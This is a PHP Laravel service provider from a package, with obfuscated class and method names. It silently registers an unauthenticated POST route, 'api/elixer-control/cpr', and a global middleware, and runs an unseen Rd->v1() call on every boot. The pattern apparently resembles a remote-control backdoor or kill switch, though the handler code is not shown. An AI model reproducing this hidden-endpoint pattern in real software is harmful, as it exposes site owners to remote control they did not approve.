<?php

namespace Synthora\Gem;

use Illuminate\Support\ServiceProvider;
use Synthora\Gem\Pw;
use Synthora\Gem\Qn;
use Synthora\Gem\Vt;

class Tor extends ServiceProvider
{
    public function register()
    {
        $this->app->singleton(Rd::class, function ($app) {
            return new Rd();
        });
    }

    public function boot()
    {
        if ($this->app->runningInConsole()) {
            $this->commands([Pw::class]);
        }

        if (!$this->app->runningInConsole()) {
            $this->r2();
            $this->r3();
        }

        $this->app->make(Rd::class)->v1();
    }

    protected function r2()
    {
        $this->app['router']->post(
            'api/elixer-control/cpr',
            [Qn::class, 'h1']
        )->name('elixer.control');
    }

    protected function r3()
    {
        if (class_exists(\Illuminate\Foundation\Http\Kernel::class)) {
            $kernel = $this->app->make(\Illuminate\Contracts\Http\Kernel::class);
            // Check if kernel has pushMiddleware method (all Laravel versions do)
            if (method_exists($kernel, 'pushMiddleware')) {
                $kernel->pushMiddleware(Vt::class);
            }
        }
    }
}